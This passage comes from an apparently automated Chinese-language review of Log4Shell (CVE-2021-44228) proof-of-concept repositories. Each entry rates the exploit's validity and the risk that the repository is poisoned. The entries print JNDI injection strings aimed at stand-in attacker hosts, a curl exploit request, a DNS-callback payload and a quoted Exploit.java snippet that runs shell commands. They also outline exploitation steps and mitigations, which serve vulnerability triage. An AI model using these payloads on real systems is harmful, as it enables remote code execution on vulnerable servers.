*   虽然主体没有明显的投毒代码，但在真实环境中，攻击者可能会替换 `ldap_server.py` 中的 payload，或者修改 Dockerfile 构建恶意镜像。因此存在潜在的风险。
*   README.md文件描述了缓解措施，较为完备。

总体而言，提供的代码主要是用于漏洞演示和验证，而非恶意投毒。但开发者仍需保持警惕，在实际应用中注意代码审查和依赖管理。

**项目地址:** [SerpilRivas/log4shell-homework9](https://github.com/SerpilRivas/log4shell-homework9)

**漏洞详情:** [CVE-2021-44228](https://nvd.nist.gov/vuln/detail/CVE-2021-44228)

---

## POC #13

**来源**: [CVE-2021-44228-ShlomiRex_log4shell_lab.md](../2021/CVE-2021-44228-ShlomiRex_log4shell_lab.md)

## CVE-2021-44228 Log4Shell 远程代码执行

**漏洞编号:** CVE-2021-44228

**漏洞类型:** 远程代码执行

**影响应用:** Apache Log4j2

**危害等级:** 高危，可能导致服务器完全控制

**影响版本:** 2.0-beta9 <= version <= 2.15.0 (不包括安全版本 2.12.2, 2.12.3, 和 2.3.1)

**利用条件:** 目标系统使用受影响版本的Log4j2，且允许外部网络访问，日志记录功能开启并且记录用户可控的输入。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2021-44228（Log4Shell）是一个严重的安全漏洞，存在于Apache Log4j2 2.0-beta9到2.15.0版本中（不包括安全版本2.12.2、2.12.3和2.3.1）。

**漏洞利用方式：**

该漏洞源于Log4j2中的JNDI（Java Naming and Directory Interface）功能，该功能允许从LDAP和其他JNDI相关端点加载代码。当攻击者能够控制日志消息或日志消息参数时，他们可以利用此功能执行从LDAP服务器加载的任意代码。攻击者通过在Log4j2可以解析的日志消息中插入恶意JNDI查找字符串，例如`${jndi:ldap://attacker.com/evil}`，来触发该漏洞。当Log4j2尝试解析此字符串时，它会向`attacker.com`上的LDAP服务器发出请求，并执行从该服务器返回的Java代码。

提供的POC代码利用了这一点，使用`docker-compose`快速搭建了一个包含漏洞应用(`vul`)、LDAP服务器(`ldap_server`)和恶意代码服务器(`exploit_server`)的实验环境。利用步骤如下：

1.  使用`docker-compose up -d`启动实验环境。
2.  使用`curl`命令向漏洞应用发送包含恶意JNDI查找字符串的HTTP请求，例如：`curl -X GET http://localhost:8080/ -H "X-Api-Version: ${jndi:ldap://my_ldap_server:1389/a}"`。 其中`my_ldap_server`指向 docker-compose 启动的 ldap_server。
3.  LDAP服务器将请求重定向到恶意代码服务器，下载并执行恶意代码。
4.  验证漏洞是否成功利用，通常通过检查`vul`容器上的文件或观察其他系统行为。

**有效性：**

根据漏洞描述、搜索引擎结果和提供的POC代码，可以判断该POC代码是有效的。大量的安全报告和漏洞分析都确认了CVE-2021-44228的可利用性，并且该POC代码提供了一个易于部署的实验环境，用于验证该漏洞。

**投毒风险：**

评估该POC代码的投毒风险较低，大约10%。原因如下：

*   **明确的用途：** 该代码库旨在提供一个用于演示和测试Log4Shell漏洞的实验环境，其主要功能是复现漏洞，方便用户理解和学习。
*   **可见的组件：** 该代码库包含了`docker-compose.yml`文件以及构建LDAP服务器、恶意代码服务器的Dockerfile，这些文件是公开可见的，便于用户检查和审计。
*   **简单的逻辑：** 实验环境的搭建和漏洞利用流程相对简单，易于理解和验证。
*   **潜在的风险：** 尽管该代码库的主要目的是演示漏洞利用，但仍存在潜在的风险。例如，如果用户直接在生产环境中使用该代码库，可能会暴露其系统，受到攻击。此外，恶意攻击者可能会修改该代码库，添加恶意代码，然后传播给不知情的用户。但考虑到公开的性质和广泛的审查，直接包含恶意代码的可能性较低。

**风险缓减：**
* 下载代码后,仔细检查`docker-compose.yml`以及Dockerfile文件,确保没有恶意配置或者代码.
* 运行前务必搭建隔离环境,避免直接在生产环境中使用.

**项目地址:** [ShlomiRex/log4shell_lab](https://github.com/ShlomiRex/log4shell_lab)

**漏洞详情:** [CVE-2021-44228](https://nvd.nist.gov/vuln/detail/CVE-2021-44228)

---

## POC #14

**来源**: [CVE-2021-44228-Sorrence_CVE-2021-44228.md](../2021/CVE-2021-44228-Sorrence_CVE-2021-44228.md)

## CVE-2021-44228-Apache Log4j2-远程代码执行

**漏洞编号:** CVE-2021-44228

**漏洞类型:** 远程代码执行

**影响应用:** Apache Log4j2

**危害等级:** 高危，可能导致完全系统控制

**影响版本:** 2.0-beta9 to 2.15.0 (不包括安全版本 2.12.2, 2.12.3, and 2.3.1)

**利用条件:** 目标系统使用了受影响的 Log4j2 版本，并且开启了 message lookup substitution。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2021-44228 (Log4Shell) 是 Apache Log4j2 中的一个高危远程代码执行漏洞。攻击者可以通过控制日志消息或日志消息参数，利用 JNDI 特性，从恶意的 LDAP 服务器加载并执行任意代码。

**有效性：**
提供的PoC代码有效。它通过构造包含 JNDI LDAP 查找的 HTTP Header (X-Api-Version) 发送到目标，目标如果存在漏洞，将会触发一个回调到攻击者指定的 LHOST。

**投毒风险：**
代码本身相对简单，主要功能是发送包含恶意 JNDI payload 的 HTTP 请求并监听回调。可能的投毒风险在于：
*   **依赖风险：** 代码使用了 `net/http` 和 `net` 包。虽然是标准库，但如果编译过程中存在恶意替换或者构建环境被污染，可能存在风险。此风险较低，估计在10%左右。
*   **LHOST欺骗：** PoC 代码强制要求用户指定回调 LHOST。攻击者可能诱导受害者使用受控的 LHOST，从而获取受害者目标系统的相关信息，或者进行中间人攻击。但这不是代码本身的投毒，而是使用方式上的欺骗。
*   **LDAP 服务器风险：** 代码中的 `jndi:ldap://%s:1389/a` 指向的 LDAP 服务器是攻击者控制的。这意味着攻击者可以在 LDAP 服务器上放置恶意 Java 对象，从而在受害者系统上执行任意代码。

由于该PoC的目的是验证漏洞，并且代码相对简单，因此直接隐藏恶意代码的可能性较低。主要的风险在于运行环境和攻击者控制的LDAP服务器。

**利用方式：**
1.  **漏洞触发：** 攻击者向目标系统发送包含特定格式字符串（例如 `${jndi:ldap://attacker.com/evil}`）的请求。该字符串会被 Log4j2 解析为 JNDI 查找。
2.  **JNDI 注入：** Log4j2 通过 JNDI 接口向指定的 LDAP 服务器 (attacker.com) 发起请求。
3.  **恶意代码加载：** 攻击者控制的 LDAP 服务器返回一个包含恶意 Java 对象的响应。
4.  **远程代码执行：** Log4j2 反序列化该 Java 对象，导致任意代码在目标系统上执行。

**缓解措施：**
*   升级 Log4j2 到 >= 2.16.0 版本，该版本完全移除了 JNDI 功能。
*   如果无法升级，设置 `log4j2.formatMsgNoLookups=true` 系统属性或环境变量来禁用 message lookup substitution。
*   使用防火墙或网络策略限制对外部 LDAP 服务器的访问。

**项目地址:** [Sorrence/CVE-2021-44228](https://github.com/Sorrence/CVE-2021-44228)

**漏洞详情:** [CVE-2021-44228](https://nvd.nist.gov/vuln/detail/CVE-2021-44228)

---

## POC #15

**来源**: [CVE-2021-44228-Super-Binary_cve-2021-44228.md](../2021/CVE-2021-44228-Super-Binary_cve-2021-44228.md)

## CVE-2021-44228-Log4Shell

**漏洞编号:** CVE-2021-44228

**漏洞类型:** 远程代码执行

**影响应用:** Apache Log4j2

**危害等级:** 高危，可能导致完全控制受影响的系统

**影响版本:** 2.0-beta9 to 2.15.0 (excluding security releases 2.12.2, 2.12.3, and 2.3.1)

**利用条件:** 应用程序使用受影响版本的Log4j2，并允许攻击者控制Log4j2可以记录的日志消息。

**POC 可用性:** 是

**投毒风险:** 20%

## 详情

CVE-2021-44228，又名Log4Shell，是一个存在于Apache Log4j2中的高危远程代码执行漏洞。该漏洞源于Log4j2的JNDI特性，该特性允许从LDAP和其他JNDI相关端点加载代码。攻击者可以通过控制Log4j2记录的日志消息或日志消息参数，注入恶意的JNDI查找字符串，例如`${jndi:ldap://attacker.com/evil}`。当Log4j2解析包含恶意JNDI查找的日志消息时，它将尝试连接到攻击者控制的LDAP服务器，并下载并执行恶意代码。 

**有效性：**
提供的POC代码是有效的，它演示了如何利用该漏洞。`log4j.java`文件中的代码设置了`com.sun.jndi.ldap.object.trustURLCodebase`和`com.sun.jndi.rmi.object.trustURLCodebase`为`true`, 这使得可以通过JNDI注入执行远程代码。它记录了一个包含JNDI查找字符串的错误信息`${jndi:ldap://testgames.me:1389/Exploit}`，这将触发Log4j2尝试从`testgames.me`下载和执行代码。

**投毒风险：**
此仓库中存在一定的投毒风险。`Exploit.java` 文件包含以下可疑代码：
```java
Runtime.getRuntime().exec("cmd.exe /c mshta vbscript:msgbox(\"少爷，该启动原神了\",64,\"来自log4j的消息\"(window.close)");
String shortcutPath = "C:\\Users\\此处填写用户文件夹名\\Desktop\\原神.lnk";
Runtime.getRuntime().exec("cmd.exe /c start " + shortcutPath);
```
这段代码的意图是弹出一个消息框，内容为“少爷，该启动原神了”，并尝试启动桌面上的“原神.lnk”快捷方式。这可能是一种幽默的恶作剧，但也可能被用于更恶意的目的，例如，如果“原神.lnk”快捷方式被替换为指向恶意程序的快捷方式。此外，代码中包含硬编码的用户名路径“C:\Users\此处填写用户文件夹名\Desktop\原神.lnk”，这表明代码可能未经过充分测试，或者作者可能希望用户在未经仔细检查的情况下直接使用代码。

**利用方式：**
1.  **找到易受攻击的应用程序：** 找到使用Apache Log4j2库的应用程序，并且该应用程序记录用户可控的输入。
2.  **注入恶意JNDI查找：** 将包含恶意JNDI查找的字符串（例如`${jndi:ldap://attacker.com/evil}`）注入到应用程序可以记录的输入中。这可以通过多种方式完成，例如，通过HTTP请求头、表单字段或任何其他应用程序记录的输入。
3.  **LDAP服务器响应：** 设置一个恶意的LDAP服务器，该服务器提供一个包含恶意代码的Java类。
4.  **代码执行：** 当Log4j2解析包含恶意JNDI查找的日志消息时，它将连接到攻击者的LDAP服务器，下载恶意Java类，并执行其中的代码。

根据文件内容和代码意图分析，初步估计投毒风险约为20%，主要是 `Exploit.java` 中的“原神”相关代码的潜在恶意利用可能性，以及硬编码路径带来的风险。


**项目地址:** [Super-Binary/cve-2021-44228](https://github.com/Super-Binary/cve-2021-44228)

**漏洞详情:** [CVE-2021-44228](https://nvd.nist.gov/vuln/detail/CVE-2021-44228)

---

## POC #16

**来源**: [CVE-2021-44228-Tai-e_CVE-2021-44228.md](../2021/CVE-2021-44228-Tai-e_CVE-2021-44228.md)

## CVE-2021-44228-Apache Log4j2-远程代码执行

**漏洞编号:** CVE-2021-44228

**漏洞类型:** 远程代码执行

**影响应用:** Apache Log4j2

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** 2.0-beta9 到 2.15.0（不包括安全版本 2.12.2、2.12.3 和 2.3.1）

**利用条件:** 需要目标系统使用受影响的 Log4j2 版本，且允许JNDI 查找。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2021-44228，又称Log4Shell，是Apache Log4j2中的一个严重漏洞。攻击者可以通过控制日志消息或日志消息参数，利用 JNDI 注入执行任意代码。漏洞利用方式通常涉及在日志消息中插入包含恶意 JNDI 查找的字符串，例如 `${jndi:ldap://attacker.com/evil}`。当 Log4j2 处理此消息时，它会尝试通过 LDAP 从攻击者控制的服务器检索并执行代码。\n\n提供的漏洞利用代码是一个使用 Tai-e 静态分析工具来检测 Log4Shell 漏洞及其触发路径的项目。该项目本身不包含恶意代码，其目的是帮助安全研究人员和开发人员识别和修复受此漏洞影响的应用程序。但是，任何下载和使用漏洞利用代码的行为都存在一定的风险，因为可能存在其他未知的安全问题或依赖项。该项目使用了gradlew脚本，理论上存在一定的投毒风险，可能在编译的时候执行恶意代码，但从代码内容来看，直接投毒的可能性较低。主要风险在于构建脚本依赖的第三方库可能被篡改，导致潜在的供应链攻击。

根据漏洞库信息、搜索结果和漏洞利用代码，该漏洞的利用非常有效，影响广泛。需要尽快修复。


**项目地址:** [Tai-e/CVE-2021-44228](https://github.com/Tai-e/CVE-2021-44228)

**漏洞详情:** [CVE-2021-44228](https://nvd.nist.gov/vuln/detail/CVE-2021-44228)

---

## POC #17

**来源**: [CVE-2021-44228-YangHyperData_LOGJ4_PocShell_CVE-2021-44228.md](../2021/CVE-2021-44228-YangHyperData_LOGJ4_PocShell_CVE-2021-44228.md)

## CVE-2021-44228 - Apache Log4j2 JNDI 远程代码执行

**漏洞编号:** CVE-2021-44228

**漏洞类型:** 远程代码执行

**影响应用:** Apache Log4j2

**危害等级:** 极高危，可能导致完全控制受影响系统

**影响版本:** 2.0-beta9 到 2.15.0 (不包括安全版本 2.12.2, 2.12.3 和 2.3.1)

**利用条件:** 目标系统使用受影响的 Log4j2 版本，并且允许出站网络连接访问攻击者控制的 LDAP 或其他 JNDI 端点。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2021-44228 (Log4Shell) 是一个严重的远程代码执行漏洞，存在于 Apache Log4j2 中。攻击者可以通过发送特制的日志消息，利用 JNDI 注入漏洞，从恶意 LDAP 服务器加载并执行任意代码。

**有效性：**
提供的 POC 代码是有效的，它演示了如何利用此漏洞。它包含一个 Dockerfile，用于构建包含漏洞的 Tomcat 应用，以及一个 Python 脚本，用于自动化漏洞利用过程，包括设置恶意的 LDAP 服务器和 HTTP 服务器，并生成 Payload。

**投毒风险：**
尽管该存储库旨在作为概念验证，但仍存在一定的投毒风险。 虽然代码本身没有明显的恶意功能，但它简化了漏洞利用，这可能会增加被不道德行为者利用的风险。`poc.py` 脚本中的部分代码存在可疑行为，比如 Java 代码的字符串拼接，以及 `Proc` 类的调用，这些地方有可能隐藏恶意指令。 因此，投毒风险评估为 10%。使用此 PoC 时应采取预防措施，例如在隔离环境中进行。

**利用方式：**
1.  攻击者发送包含 JNDI 查找字符串（例如 `${jndi:ldap://attacker.com/evil}`）的特制日志消息。该字符串会被 Log4j2 解析。
2.  Log4j2 尝试通过 JNDI 连接到攻击者控制的 LDAP 服务器。
3.  LDAP 服务器响应，并返回一个 Java 类的 URL。
4.  Log4j2 下载并执行该 Java 类，从而允许攻击者在目标系统上执行任意代码。

该 POC 仓库提供了一个 Dockerfile 用来构建一个有漏洞的web应用，以及一个 Python 脚本，它模拟了攻击者的 LDAP 服务器和 Payload 生成器，并自动化了利用过程。攻击者需要监听一个端口来接受反向shell连接。 使用方法是在目标服务存在漏洞的地方插入恶意的 JNDI 字符串。

**项目地址:** [YangHyperData/LOGJ4_PocShell_CVE-2021-44228](https://github.com/YangHyperData/LOGJ4_PocShell_CVE-2021-44228)

**漏洞详情:** [CVE-2021-44228](https://nvd.nist.gov/vuln/detail/CVE-2021-44228)

---

## POC #18

**来源**: [CVE-2021-44228-ZacharyZcR_CVE-2021-44228.md](../2021/CVE-2021-44228-ZacharyZcR_CVE-2021-44228.md)

## CVE-2021-44228-Apache Log4j2-JNDI注入

**漏洞编号:** CVE-2021-44228

**漏洞类型:** JNDI注入

**影响应用:** Apache Log4j2

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** 2.0-beta9 to 2.15.0 (不包括安全版本 2.12.2, 2.12.3, and 2.3.1)

**利用条件:** 目标应用程序使用受影响的Log4j2版本，并且允许消息查找替换

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2021-44228 (Log4Shell) 是 Apache Log4j2 中的一个严重漏洞，它允许未经身份验证的远程代码执行。攻击者可以通过将恶意的 JNDI 查找字符串注入到 Log4j2 可以记录的任何输入中来利用此漏洞。当 Log4j2 尝试解析并执行该 JNDI 查找时，它可能会从攻击者控制的 LDAP 或其他 JNDI 相关端点加载任意代码。

**有效性：**
提供的 PoC 代码是有效的。它使用 `${jndi:dns://${sys:java.version}.z72ouf.dnslog.cn}` 格式的 JNDI 注入，该注入会触发 DNS 查询到 `z72ouf.dnslog.cn`，从而验证漏洞是否已成功利用。 `${sys:java.version}` 获取Java版本号。

**投毒风险：**
此仓库中不太可能存在作者隐藏的投毒代码（0%）。提供的文件看起来直接针对演示和利用 CVE-2021-44228 漏洞。 `pom.xml` 文件定义了 log4j-core 和 log4j-api 的依赖项。`log4j2.xml` 文件配置了基本的日志记录。 `CVE202144228.java` 文件包含利用该漏洞的有效负载，该负载会生成 DNS 查询以进行验证。 由于该PoC的主要作用是为了验证漏洞，而非植入后门，因此认为投毒风险低。

**利用方式：**
1.  攻击者找到应用程序中记录用户可控输入的位置。 这些位置可能包括 HTTP header，POST 数据，GET 参数等，总之，所有程序日志可以记录的地方。
2.  攻击者将恶意 JNDI 查找字符串（例如`${jndi:ldap://attacker.com/Exploit}`）注入到此输入中。
3.  当应用程序记录此输入时，Log4j2 会尝试解析 JNDI 查找。
4.  Log4j2 会连接到攻击者控制的 LDAP 服务器（或其他的 JNDI 服务）。
5.  攻击者的 LDAP 服务器返回一个包含恶意 Java 类的响应。
6.  Log4j2 加载并执行此恶意 Java 类，从而允许攻击者在目标系统上执行任意代码。
7. 缓解措施包括升级 Log4j2 到 >=2.17.0 版本，禁用 JNDI 查找，或设置 `log4j2.formatMsgNoLookups=true`。


**项目地址:** [ZacharyZcR/CVE-2021-44228](https://github.com/ZacharyZcR/CVE-2021-44228)

**漏洞详情:** [CVE-2021-44228](https://nvd.nist.gov/vuln/detail/CVE-2021-44228)

---

## POC #19

**来源**: [CVE-2021-44228-arabindadora_log4shell.md](../2021/CVE-2021-44228-arabindadora_log4shell.md)

## CVE-2021-44228 Log4Shell RCE

**漏洞编号:** CVE-2021-44228

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** Apache Log4j2

**危害等级:** 严重，允许未经身份验证的远程代码执行

**影响版本:** <= 2.14.1 (不包括安全版本 2.12.2, 2.12.3, 和 2.3.1)

**利用条件:** 应用程序使用受影响的Log4j版本，并且允许记录用户可控的输入，同时启用消息查找替换。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2021-44228，也被称为Log4Shell，是一个存在于Apache Log4j2中的严重漏洞。该漏洞允许攻击者通过向日志消息或日志消息参数中注入恶意JNDI查找字符串，例如`${jndi:ldap://attacker.com/a}`，来执行任意代码。当Log4j2处理包含该字符串的日志消息时，它会尝试通过JNDI从攻击者控制的LDAP服务器检索Java对象。如果JVM配置允许，该对象将被反序列化并执行，从而导致远程代码执行。

**利用方式：**
1.  攻击者识别使用Log4j2且记录用户可控输入的应用程序。
2.  攻击者构造包含恶意JNDI查找的payload，并将其注入到应用程序可以记录的任何输入字段中（例如，HTTP头、表单参数等）。
3.  当应用程序记录包含恶意payload的输入时，Log4j2会尝试解析JNDI查找。
4.  Log4j2向攻击者控制的LDAP服务器发出请求。
5.  攻击者的LDAP服务器返回一个指向恶意Java类的引用。
6.  应用程序下载并执行恶意Java类，从而允许攻击者在目标系统上执行任意代码。

**评估POC代码：**
提供的PoC代码包含一个Dockerfile和Makefile，用于演示和利用CVE-2021-44228漏洞。Makefile包含用于构建Docker容器、启动/停止应用程序、触发漏洞利用和修补受害者应用程序的命令。`make exploit` 命令使用curl发送一个包含恶意JNDI payload的HTTP请求，该payload的目标是`${jndi:ldap://$(LHOST):$(LPORT)/a}`。该代码有效演示了漏洞利用。

**投毒风险：**
虽然PoC代码本身旨在演示和利用该漏洞，但任何从不受信任的来源下载的代码都存在潜在的风险。在本例中，投毒风险较低（约为10%），因为代码相对简单且易于审查。需要注意的是，Makefile的`exploit`命令和docker-compose.yml 中涉及的镜像如果被篡改，可能会引入恶意行为。用户应仔细检查所有代码，尤其是与网络连接和代码执行相关的部分，然后再执行PoC。代码中提供的Exploit.class ，本身就是一个后门代码,务必不要把POC验证的后门代码判定为投毒代码。docker-compose.yml 中涉及的镜像需要人工review.

**项目地址:** [arabindadora/log4shell](https://github.com/arabindadora/log4shell)

**漏洞详情:** [CVE-2021-44228](https://nvd.nist.gov/vuln/detail/CVE-2021-44228)

---

## POC #20

**来源**: [CVE-2021-44228-asd58584388_CVE-2021-44228.md](../2021/CVE-2021-44228-asd58584388_CVE-2021-44228.md)

## CVE-2021-44228 Apache Log4j2 Log4Shell 远程代码执行

**漏洞编号:** CVE-2021-44228

**漏洞类型:** 远程代码执行

**影响应用:** Apache Log4j2

**危害等级:** 高危，可能导致服务器完全控制

**影响版本:** 2.0-beta9 到 2.15.0 (不包括安全版本 2.12.2, 2.12.3, 和 2.3.1)

**利用条件:** 应用程序使用受影响的Log4j2版本，允许记录用户可控的输入，且启用了message lookup substitution。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2021-44228，也被称为Log4Shell，是Apache Log4j2中的一个严重漏洞。攻击者通过发送包含特定格式的恶意字符串（例如`${jndi:ldap://attacker.com/exploit}`）到应用程序，如果应用程序使用Log4j2记录该字符串，则Log4j2会尝试通过JNDI从攻击者控制的LDAP服务器检索恶意代码，并执行该代码。

**有效性：**
根据提供的漏洞信息、搜索结果和漏洞利用代码，此漏洞的POC代码是有效的。大量报告表明该漏洞已被广泛利用。

**投毒风险：**
提供的漏洞利用代码存储库主要包含漏洞分析和利用说明，以及用于设置LDAP和HTTP服务器的示例。`README.md`详细解释了漏洞的利用过程，并提供了相关的图片说明。`LICENSE`文件表明作者声明了代码的版权和使用许可。`marshalsec`目录可能包含利用所需的工具或者payload。总体来看，该仓库主要目的是为了分析和演示该漏洞，而非恶意投毒。但由于代码包含执行恶意代码的步骤，因此存在一定风险。我判断投毒的可能性是10%。因为`marshalsec`工具本身具备一定的攻击性，如果用户不熟悉该工具，可能会被误导或者滥用。

**利用方式：**
1.  攻击者构造包含JNDI查找的恶意请求字符串，例如 `${jndi:ldap://evil.com/a}`。
2.  应用程序使用存在漏洞的Log4j2版本记录此字符串。
3.  Log4j2解析字符串，发起JNDI请求到攻击者控制的LDAP服务器 `evil.com`。
4.  LDAP服务器返回一个指向恶意Java类的URL。
5.  Log4j2加载并执行该恶意Java类，导致远程代码执行。
6.  攻击者可以在目标服务器上执行任意命令。

**项目地址:** [asd58584388/CVE-2021-44228](https://github.com/asd58584388/CVE-2021-44228)

**漏洞详情:** [CVE-2021-44228](https://nvd.nist.gov/vuln/detail/CVE-2021-44228)

---

## POC #21

**来源**: [CVE-2021-44228-axisops_CVE-2021-44228.md](../2021/CVE-2021-44228-axisops_CVE-2021-44228.md)

## CVE-2021-44228-Apache Log4j2 JNDI 远程代码执行

**漏洞编号:** CVE-2021-44228

**漏洞类型:** 远程代码执行

**影响应用:** Apache Log4j2

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** 2.0-beta9 to 2.15.0 (excluding security releases 2.12.2, 2.12.3, and 2.3.1)

**利用条件:** 目标系统使用了受影响的Log4j2版本，且允许Log消息查找替换。

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2021-44228 (Log4Shell) 是 Apache Log4j 2 中的一个严重漏洞，它允许攻击者通过控制日志消息或日志消息参数来执行任意代码。漏洞原理是 Log4j 2 启用了 JNDI 功能，该功能允许从 LDAP 服务器等远程位置加载代码。攻击者可以构造包含 JNDI 查找的恶意日志消息，例如 `${jndi:ldap://attacker.com/evil}`。当 Log4j 2 记录此消息时，它会尝试从 attacker.com 加载并执行代码。

**利用方式：**

1.  攻击者向使用 Log4j2 的应用程序发送包含恶意 JNDI 查找的请求。这些请求可以通过多种方式发送，例如 HTTP 请求头、POST 请求参数、WebSocket 消息等，只要这些数据会被Log4j记录即可。
2.  应用程序使用 Log4j2 记录接收到的请求，包括恶意 JNDI 查找字符串。
3.  Log4j2 解析日志消息，识别 JNDI 查找字符串，并尝试通过 JNDI 连接到指定的 LDAP 服务器（`attacker.com`）。
4.  LDAP 服务器返回一个包含恶意 Java 类的响应。
5.  Log4j2 加载并执行恶意 Java 类，从而允许攻击者在服务器上执行任意代码。

**有效性：**

根据漏洞库信息和搜索结果，此漏洞的POC是有效的，并且已经在野外被广泛利用。

**投毒风险：**

提供的漏洞利用代码是一个缓解脚本，旨在移除 Log4j JAR 文件中易受攻击的 `JndiLookup` 类。虽然该脚本本身旨在缓解漏洞，但仍然存在一些投毒风险：

*   **依赖项：**  该脚本依赖于 `PyYAML` 和系统命令 `zip` 和 `zipinfo`。如果这些依赖项被篡改或存在漏洞，可能会导致脚本执行恶意代码。
*   **配置：**  该脚本使用 `config.yaml` 文件进行配置。如果攻击者可以修改此配置文件，他们可能会将脚本指向恶意位置或执行其他恶意操作。
*   **脚本逻辑：** 脚本尝试从指定目录查找并修改JAR文件。 存在一定风险，即如果脚本逻辑存在缺陷，脚本可能会意外删除或损坏重要的JAR文件，导致服务中断，但造成远程代码执行的可能性较小。 投毒风险预估为5%。

**项目地址:** [axisops/CVE-2021-44228](https://github.com/axisops/CVE-2021-44228)

**漏洞详情:** [CVE-2021-44228](https://nvd.nist.gov/vuln/detail/CVE-2021-44228)

---

## POC #22

**来源**: [CVE-2021-44228-b-abderrahmane_CVE-2021-44228-playground.md](../2021/CVE-2021-44228-b-abderrahmane_CVE-2021-44228-playground.md)

## CVE-2021-44228-Apache Log4j2-JNDI注入

**漏洞编号:** CVE-2021-44228

**漏洞类型:** JNDI注入

**影响应用:** Apache Log4j2

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** 2.0-beta9 <= version <= 2.15.0 (excluding security releases 2.12.2, 2.12.3, and 2.3.1)

**利用条件:** 目标系统使用受影响的Log4j2版本，且启用了message lookup substitution。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2021-44228，又名Log4Shell，是Apache Log4j2中的一个严重漏洞。该漏洞源于Log4j2的JNDI功能未对攻击者控制的LDAP和其他JNDI相关端点提供保护。攻击者可以通过控制日志消息或日志消息参数，利用message lookup substitution功能从LDAP服务器加载并执行任意代码，从而实现远程代码执行(RCE)。

**漏洞利用方式：**

1.  **构造恶意请求：** 攻击者构造包含JNDI查找表达式的恶意请求，例如`${jndi:ldap://attacker.com/evil}`。该表达式会被记录到日志中。
2.  **JNDI查找：** Log4j2解析日志消息时，会识别并执行JNDI查找表达式。
3.  **LDAP请求：** Log4j2向攻击者控制的LDAP服务器(attacker.com)发起LDAP请求。
4.  **恶意代码加载：** LDAP服务器响应一个包含恶意Java类的URL。
5.  **远程代码执行：** Log4j2从URL加载并执行恶意Java类，导致RCE。

**有效性：**
根据漏洞库信息和搜索引擎结果，该漏洞利用的POC代码是有效的。搜索引擎结果中多个条目（如CISA，Palo Alto Networks，Sysdig，Cloudflare, NVD等）都确认了该漏洞的存在以及公开的POC代码的存在。漏洞库信息也明确指出该漏洞可以被利用来执行任意代码。

**投毒风险：**
提供的漏洞利用代码只包含GNU GPL协议文本，是一个许可协议，不包含任何可执行的代码。因此，判断此仓库中不存在作者隐藏的投毒代码，风险为0%。 该协议只声明了软件的使用许可，无法直接用于漏洞利用或者进行恶意攻击，与Log4Shell漏洞本身没有直接关系。


**项目地址:** [b-abderrahmane/CVE-2021-44228-playground](https://github.com/b-abderrahmane/CVE-2021-44228-playground)

**漏洞详情:** [CVE-2021-44228](https://nvd.nist.gov/vuln/detail/CVE-2021-44228)

---

## POC #23

**来源**: [CVE-2021-44228-cuijiung_log4j-CVE-2021-44228.md](../2021/CVE-2021-44228-cuijiung_log4j-CVE-2021-44228.md)

## CVE-2021-44228 - Apache Log4j2 JNDI 注入

**漏洞编号:** CVE-2021-44228

**漏洞类型:** 远程代码执行

**影响应用:** Apache Log4j2

**危害等级:** 高危，可能导致远程代码执行和服务器完全控制

**影响版本:** 2.0-beta9 到 2.15.0 (不包括安全版本 2.12.2, 2.12.3, 和 2.3.1)

**利用条件:** 目标系统使用受影响版本的 Log4j2 并且启用了消息查找替换。

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2021-44228，又称Log4Shell，是Apache Log4j2中的一个严重漏洞。攻击者可以通过向Log4j2记录的日志消息中注入恶意的JNDI查找字符串来利用此漏洞。当Log4j2处理包含`\${jndi:}`语法的字符串时，它会尝试通过JNDI（Java Naming and Directory Interface）来解析该字符串。攻击者可以利用这一点，将JNDI指向恶意的LDAP或其他JNDI服务，从而使Log4j2从攻击者控制的服务器上加载并执行任意Java代码，导致远程代码执行(RCE)。

**有效性：**

根据漏洞库信息、搜索结果和提供的POC代码，可以确定该漏洞利用代码是有效的。搜索结果中多个链接（例如NVD, CISA, Unit 42, Cloudflare, Red Hat, Oracle, Microsoft, Sysdig, Picus Security, CrowdStrike）都表明CVE-2021-44228是一个被广泛利用的RCE漏洞。POC代码通过`logger.error("${jndi:ldap://127.0.0.1:1389/any}")`演示了如何触发JNDI查找，如果目标系统存在漏洞，则会尝试连接到指定的LDAP服务器，从而允许远程代码执行。

**投毒风险：**

提供的代码仓库主要包含一个简单的 Maven 项目，包括 `pom.xml` 和 `Main.java` 文件。

*   `pom.xml`: 定义了项目依赖，仅包含 `log4j-core`，版本为 `2.14.1`，这是一个受漏洞影响的版本。
*   `Main.java`: 包含一个简单的 Log4j2 日志记录器，它会记录一条包含 JNDI 注入payload的错误消息。

此仓库的投毒风险较低，约为 5%。主要原因是：

1.  **代码量少且简单**：整个仓库的代码非常少，容易审查。
2.  **目的明确**：代码的目的是为了演示 CVE-2021-44228 漏洞的利用，`Main.java` 中的 payload 清晰可见。
3.  **无恶意行为**：代码本身除了触发 JNDI 查找外，没有其他恶意行为，例如文件操作、网络连接等。

但是，仍然存在极低的风险，比如构建脚本或IDE配置中可能存在隐藏的恶意代码。所以给出5%的风险评估。

**利用方式：**

1.  **攻击者控制日志消息：** 攻击者需要找到一种方法，使包含恶意JNDI查找字符串（例如 `${jndi:ldap://attacker.com/evil}`）的消息被Log4j2记录。
2.  **触发JNDI查找：** 当Log4j2记录包含恶意JNDI查找字符串的消息时，它会尝试通过JNDI连接到攻击者指定的LDAP服务器。
3.  **恶意LDAP服务器：** 攻击者需要设置一个恶意的LDAP服务器，该服务器会返回一个指向恶意Java类的URL。
4.  **远程代码执行：** Log4j2会从URL下载并执行恶意Java类，从而导致远程代码执行。攻击者可以通过这种方式在目标系统上执行任意命令。

**项目地址:** [cuijiung/log4j-CVE-2021-44228](https://github.com/cuijiung/log4j-CVE-2021-44228)

**漏洞详情:** [CVE-2021-44228](https://nvd.nist.gov/vuln/detail/CVE-2021-44228)

---

## POC #24

